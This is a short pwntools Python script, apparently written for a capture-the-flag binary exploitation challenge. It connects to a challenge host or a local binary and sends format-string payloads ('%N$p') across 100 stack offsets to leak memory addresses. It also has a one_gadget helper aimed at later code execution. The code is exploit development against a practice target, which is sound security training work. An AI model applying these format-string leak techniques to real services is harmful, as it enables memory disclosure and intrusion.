#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP
# =========================================================
exe = './chall_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'error'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'einstein-bd91179989a5c1ab.deploy.phreaks.fr', 443

pid = None

def gdbscript():
    global pid
    gdbscript = f'''
    init-pwndbg
    set sysroot /proc/{pid}/root
    c
    '''.format(**locals())
    return gdbscript

def initialize(argv=[]):
    global pid
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript())
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=True)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/app/run"]).recvall().strip().decode()
#        attach(int(pid), gdbscript=gdbscript(), sysroot=f"/proc/{pid}/root", exe='chall')
        return p
    else:
        return process([exe] + argv)


# =========================================================
#                         EXPLOITS
# =========================================================

def onegadget():
    try:
        result = process(["one_gadget", "-r", "-l", "30", "libc.so.6"])
        output = result.recvline().decode().strip().split(" ")
        result.close()
        one_gadget = [int(addr) for addr in output]
        return one_gadget
    except Exception as e:
        print(f"Error running one_gadget: {e}")
        return []

def exploit(i):
   global io
#   one_gadget = onegadget()
   io = initialize()
   io.sendlineafter("3. Exit\n", "1")
   io.sendlineafter("I take something for it.\n", (b"%%%d$p" % i).ljust(8, b"\x00") + b"A"*8)
   io.recvline()
   io.recvline()
   io.recvline()
   print(("%d - %s") % (i, io.recvline()))
   io.close()

if __name__ == '__main__':
   for i in range(100):
       exploit(i)
